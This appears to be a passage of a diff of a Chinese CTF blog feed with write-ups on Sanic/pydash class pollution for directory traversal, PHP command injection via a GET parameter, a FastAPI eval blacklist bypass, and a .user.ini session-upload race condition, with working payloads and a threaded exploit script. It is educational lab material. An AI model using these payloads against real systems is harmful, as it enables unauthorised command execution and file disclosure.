-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br></pre></td></tr></table></figure>
-
-<p>他这个给了secret的路径</p>
-<p>访问看看</p>
-<p><img src="/imgs/12.png"></p>
-<p>他说flag在app路由下，但是不知道他的名字 让我们找</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br></pre></td></tr></table></figure>
-
-<p>还给了&#x2F;adminLook的路由</p>
-<p><img src="/imgs/13.png"></p>
-<p>我们传入恶意的key 比如part 这一步很重要到后面来解释</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>传入后我们发现多了两个文件</p>
-<p><img src="/imgs/14.png"></p>
-<p>有点不一样是因为靶机过期了重新打开了</p>
-<p>我们先切换到&#x2F;tmp目录</p>
-<p><img src="/imgs/15.png"></p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>#对base属性进行污染</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/4KDN4B&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>#打开目录功能</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>访问static&#x2F;4KDN4B..&#x2F;</p>
-<p><img src="/imgs/16.png" alt="image-20240723165717529"></p>
-<p>最后得到flag的名字直接访问就好</p>
-<p>在把静态文件目录换成为根目录</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>之前知道flag在app路由下</p>
-<p>&#x2F;static&#x2F;app&#x2F;45W698WqtsgQT1_flag</p>
-<p><img src="/imgs/17.png"></p>
-<p>接下来解释上面遗留的问题</p>
-<p>那么为什么要恶意操作被后台日志记录呢？</p>
-<p>这里复现完了我先把大佬的wp链接放出来，因为我水平有限，基本上就是照着大佬wp来进行复现</p>
-<p>有点为了复现而复现的丑陋感，到后面我会慢慢补好基础的┭┮﹏┭┮</p>
-<p><a href="https://www.cnblogs.com/gxngxngxn/p/18290489">https://www.cnblogs.com/gxngxngxn/p/18290489</a></p>
-<p><a href="https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98">https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98</a></p>
-<p><a href="https://blog.csdn.net/2301_79700060/article/details/140632405">https://blog.csdn.net/2301_79700060/article/details/140632405</a></p>
-<p><a href="https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502</a></p>
-<p>那么我们从</p>
-<p>[<strong>gxngxngxn]</strong></p>
-<p>大佬的文章来解释下</p>
-<p>这套题目其实是ciscn2024 改的一道题目，先放链接</p>
-<p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
-<p>国赛 sanic的源码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>&#x2F;admin 路由那块就是编码成八进制可以进入&#x2F;login,而且需要绕过waf大佬文章都讲了</p>
-<p>直接看sanic那块污染链寻找</p>
-<p>我们可以污染__file__然后进行任意文件读取，但是我们不知道flag的位置所以可以开启目录功能，有关的两个函数</p>
-<p><strong>directory_view</strong> <strong>directory_handler</strong></p>
-<p>只要我们将directory污染为根目录，directory_view污染为True，就可以看到根目录的所有文件了</p>
-<p>这个框架可以通过**app.router.name_index[‘xxxxx’]**来获取注册的路由</p>
-<p>获得这个路由之后我们需要调用到DirectoryHandler里</p>
-<p>我们可以用<strong>name_index</strong>方法发现可以从handler入手，一直可以获取到DirectoryHandler中的directory和directory_view</p>
-<p>从而实现污染达到列目录的目的</p>
-<p>然后接下里就是污染directory</p>
-<p>但是directory是一个对象，而它之前的值就是由其中的<strong>parts</strong>属性决定的，但是由于这个属性是一个tuple，不能直接被污染，所以我们需要找到这个属性是如何被赋值的?（这里我们需要知道tuple(元组：元组是 Python 中的一种数据结构，用于存储多个元素。与列表类似，元组也是一个序列，但与列表不同的是，元组是不可变的。这意味着元组一旦创建，其内容不能修改)）</p>
-<p>所以不能直接污染directory </p>
-<p>但在DirectoryHandler类中有Directory属性可以从这入手进入path对象parts的值最后是给了_parts这个属性发现是list</p>
-<p>最终污染成&#x2F;就成功了</p>
-<p>到时候要去复现下国赛ciscn毕竟那天坐了一天牢</p>
-<p>到这还没完还没</p>
-<p>我们继续看DirectoryHandler类中handle方法中的逻辑:</p>
-<p>当我们开启列目录功能后，就会进入</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>._index(    <span class="variable language_">self</span>.directory / current, path, request.app.debug )</span><br></pre></td></tr></table></figure>
-
-<p>解决上面遗留的问题就是从这开始发现这个目录路径是由Parts+current拼接出来的</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">self</span>.directory / current,path, request.app .debug</span><br></pre></td></tr></table></figure>
-
-<p>目的就是让current变成.. 实现目录穿越</p>
-<p>看下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(<span class="variable language_">self</span>.base) :].strip(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从给定的路径中去除基本路径（`self.base`），然后返回剩余路径。首先，`path.strip(&quot;/&quot;)` 去除路径两端的斜杠，然后`[len(self.base):]` 取基本路径之后的部分，最后`.strip(&quot;/&quot;)` 再次去除剩余路径两端的斜杠</span><br><span class="line"></span><br><span class="line">#可以看到current的值就是由path和base两个值决定的</span><br></pre></td></tr></table></figure>
-
-<p>self.base是可控的</p>
-<p><strong>那么我们就得构造current的值</strong></p>
-<p>关键就在于下面</p>
-<p>所以实现目录穿越只要让path的值为static&#x2F;一个目录&#x2F; current值为..就好了</p>
-<p>但是这个目录怎么来？</p>
-<p><strong>file_or_directory</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以改变静态文件的默认路径</span><br><span class="line"></span><br><span class="line">我们只需要通过这个改变到其他目录，该目录下存在其他目录不就好了</span><br></pre></td></tr></table></figure>
-
-<p>它可以改变static的默认路径</p>
-<p>这就是上面为什么需要传入恶意的key,目的就是让日志记录，获得一个报错的目录</p>
-<p>继续改变目录位置（上面改的是&#x2F;tmp）然后修改其base的值为自己报错的目录</p>
-<p>就看实现目录穿越了</p>
-<p>ile_or_directory只是改变它识别的路径，并不会改变</p>
-<p>self.directory中parts的值，这个列目录的值依旧是默认的</p>
-]]></content>
-      <categories>
-        <category>pollute</category>
-      </categories>
-      <tags>
-        <tag>复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfshow原谅杯</title>
-    <url>/2024/07/19/ctfshow%E5%8E%9F%E8%B0%85%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h2><p>源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>])?<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>]):<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-
-<p>发现xbx可以rce</p>
-<p>ls 发现</p>
-<p>index.php yuanliang_4_xxx.zip</p>
-<p>并且flag在&#x2F;目录里面</p>
-<p>直接cat发现不行</p>
-<p>我们ls &#x2F;bin目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin 目录是 Unix/Linux 系统中的一个重要目录,它存放着许多常用的可执行文件(二进制文件)。这些文件通常是系统管理员或普通用户经常使用的基本命令和应用程序</span><br></pre></td></tr></table></figure>
-
-<p>最终发现sh rm ls 这三个命令可以执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh是一个轻量级的shell,相比于bash等更高级的shell,它提供了更基础的功能。但它仍然是许多系统管理任务的首选shell。</span><br></pre></td></tr></table></figure>
-
-<p>明显让我们用sh来做题目</p>
-<p>sh也可以像cat一样读取文件内容但是有一点不同</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# cat Gu0f3n.txt</span><br><span class="line">Gu0f3n</span><br><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# sh Gu0f3n.txt</span><br><span class="line">Gu0f3n.txt: line 1: Gu0f3n: command not found</span><br></pre></td></tr></table></figure>
-
-<p>他会报错 command not found</p>
-<p>因为当命令不被正常执行则会报错</p>
-<p>这里我们可以用linux重定向错误输出</p>
-<p>我们都知道在文件描述符中0，1，2 分表示标准输入，标准输出，标准错误输出</p>
-<p>其次我们需要了解规律</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.标准输入0、输出1、错误2需要分别重定向，一个重定向只能改变它们中的一个</span><br><span class="line">2. 标准输入0和标准输出1可以省略。（当其出现重定向符号左侧时）  </span><br><span class="line">3. 文件描述符在重定向符号左侧时直接写即可，在右侧时前面加&amp; </span><br><span class="line">4.  文件描述符与重定向符号之间不能有空格</span><br></pre></td></tr></table></figure>
-
-<p>参考文章：<a href="https://blog.csdn.net/weixin_29491885/article/details/111050189">https://blog.csdn.net/weixin_29491885/article/details/111050189</a></p>
-<p>那么这道题目我们</p>
-<p>用sh读取&#x2F;flag的内容将他的报错输出</p>
-<p>sh &#x2F;flag 2&gt;%261</p>
-<p>需要姜&amp;url编码为%26</p>
-<p>paylod:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xbx=sh%20/flag%202&gt;%261</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><p>打开题目</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;“你好”：“fastapi2”&#125;</span><br></pre></td></tr></table></figure>
-
-<p>fast api2</p>
-<p>首先就是了解fastapi2这个东西</p>
-<p>FastAPI 是一个现代、快速（高性能）的 Web 框架，用于构建基于 Python 的 **<a href="https://apifox.com/apiskills/understanding-apis/">API</a>**。它是一个开源项目，基于 Starlette 和 Pydantic 库构建而成，提供了强大的功能和高效的性能。</p>
-<p>在 FastAPI 中，<code>/docs</code> 路由提供了一个自动生成的交互式 API 文档界面。这是 FastAPI 的一个非常有用的特性，用于查看和测试 API 的各个端点</p>
-<p>在更具题目给的提示</p>
-<p>进入路由</p>
-<p>发现三个函数</p>
-<p>其中第二个calc</p>
-<p>根据提示给的黑名单</p>
-<p>我们展示全局变量</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">globals</span>())</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/3.png"></p>
-<p>发现可疑的变量youdontknow</p>
-<p>展示这个变量发现一堆过滤得到关键词</p>
-<p>我们用</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">youdontknow.clear()</span><br></pre></td></tr></table></figure>
-
-<p>clear掉过滤的关键词语</p>
-<p>最后直接读flag</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/4.png"></p>
-<h3 id="fastapi2-for-阿狸"><a href="#fastapi2-for-阿狸" class="headerlink" title="fastapi2 for 阿狸"></a>fastapi2 for 阿狸</h3><p><strong>和5一样</strong></p>
-<p>clear掉</p>
-<p>嗨嗨</p>
-<h2 id="原谅6-web3"><a href="#原谅6-web3" class="headerlink" title="原谅6_web3"></a>原谅6_web3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line">(<span class="title function_ invoke__">waf_file</span>(<span class="variable">$file</span>)&amp;&amp;<span class="title function_ invoke__">waf_content</span>(<span class="variable">$content</span>))?(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>)):<span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
-
-<p>简单来说就是你输进去的文件不在waf的绕过里面就可以了</p>
-<p>绕过的东西很多但是没有绕过**.user.ini**</p>
-<p>.user.ini 文件是<strong>PHP 中用于配置特定目录的设置的特殊文件</strong>。 它类似于Apache 服务器中的 . htaccess 文件，但仅适用于PHP。 .user.ini 文件允许用户为特定目录定义PHP 配置指令，这些配置指令将在该目录及其所有子目录中的PHP 脚本执行时生效。</p>
-<p><code>.user.ini</code> 文件的主要目的是为了允许非管理员用户自定义某些 PHP 配置选项，而不需要访问主 <code>php.ini</code> 文件。这样，不同的应用程序或用户可以在自己的目录中设置特定的 PHP 配置，而不影响整个服务器的配置。</p>
-<p>这里的考点就是session和.user.ini的条件竞争</p>
-<p>参考文章：<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
-<p><strong>auto_prepend_file 表示在php程序加载应用程序前加载指定的php文件</strong></p>
-<p>GET：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=.user.ini</span><br></pre></td></tr></table></figure>
-
-<p>POST:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/tmp/sess_Gu0f3n</span><br></pre></td></tr></table></figure>
-
-<p>然后用下大佬的脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># Author：Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Gu0f3n&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://c41b9ab0-e1f5-4e05-b75c-a7ea64fa3d91.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php system(&#x27;cat ./flag.php&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Gu0f3n.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.get(url+<span class="string">&quot;waf.php&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="comment"># 第一步上传.user.ini文件，将我们的session文件内容添加到默认头</span></span><br><span class="line">        y4tacker = &#123;</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: <span class="string">&quot;auto_prepend_file=/tmp/sess_&quot;</span> + sessid</span><br><span class="line">        &#125;</span><br><span class="line">        session.post(url + <span class="string">&quot;?file=.user.ini&quot;</span>, data=y4tacker)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-
-<p>结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//$flag=&#x27;ctfshow&#123;d78ac2f0-9b57-4159-a162-6b944e7b495b&#125;&#x27;;</span><br><span class="line">|a:5:&#123;s:10:&quot;start_time&quot;;i:1721961458;s:14:&quot;content_length&quot;;i:51487;s:15:&quot;bytes_processed&quot;;i:5259;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:10:&quot;Gu0f3n.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1721961458;s:15:&quot;bytes_processed&quot;;i:5259;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>ctfshow</category>
-      </categories>
-      <tags>
-        <tag>复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ciscn2024的一些反思</title>
     <url>/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/</url>
     <content><![CDATA[<h3 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a><strong>什么是反弹shell</strong></h3><p>reverse shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
@@ -1078,6 +879,261 @@ $$O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";
 ]]></content>
       <tags>
         <tag>CISCN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow原谅杯</title>
+    <url>/2024/07/19/ctfshow%E5%8E%9F%E8%B0%85%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>])?<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>]):<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>发现xbx可以rce</p>
+<p>ls 发现</p>
+<p>index.php yuanliang_4_xxx.zip</p>
+<p>并且flag在&#x2F;目录里面</p>
+<p>直接cat发现不行</p>
+<p>我们ls &#x2F;bin目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin 目录是 Unix/Linux 系统中的一个重要目录,它存放着许多常用的可执行文件(二进制文件)。这些文件通常是系统管理员或普通用户经常使用的基本命令和应用程序</span><br></pre></td></tr></table></figure>
+
+<p>最终发现sh rm ls 这三个命令可以执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh是一个轻量级的shell,相比于bash等更高级的shell,它提供了更基础的功能。但它仍然是许多系统管理任务的首选shell。</span><br></pre></td></tr></table></figure>
+
+<p>明显让我们用sh来做题目</p>
+<p>sh也可以像cat一样读取文件内容但是有一点不同</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# cat Gu0f3n.txt</span><br><span class="line">Gu0f3n</span><br><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# sh Gu0f3n.txt</span><br><span class="line">Gu0f3n.txt: line 1: Gu0f3n: command not found</span><br></pre></td></tr></table></figure>
+
+<p>他会报错 command not found</p>
+<p>因为当命令不被正常执行则会报错</p>
+<p>这里我们可以用linux重定向错误输出</p>
+<p>我们都知道在文件描述符中0，1，2 分表示标准输入，标准输出，标准错误输出</p>
+<p>其次我们需要了解规律</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.标准输入0、输出1、错误2需要分别重定向，一个重定向只能改变它们中的一个</span><br><span class="line">2. 标准输入0和标准输出1可以省略。（当其出现重定向符号左侧时）  </span><br><span class="line">3. 文件描述符在重定向符号左侧时直接写即可，在右侧时前面加&amp; </span><br><span class="line">4.  文件描述符与重定向符号之间不能有空格</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<a href="https://blog.csdn.net/weixin_29491885/article/details/111050189">https://blog.csdn.net/weixin_29491885/article/details/111050189</a></p>
+<p>那么这道题目我们</p>
+<p>用sh读取&#x2F;flag的内容将他的报错输出</p>
+<p>sh &#x2F;flag 2&gt;%261</p>
+<p>需要姜&amp;url编码为%26</p>
+<p>paylod:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xbx=sh%20/flag%202&gt;%261</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><p>打开题目</p>
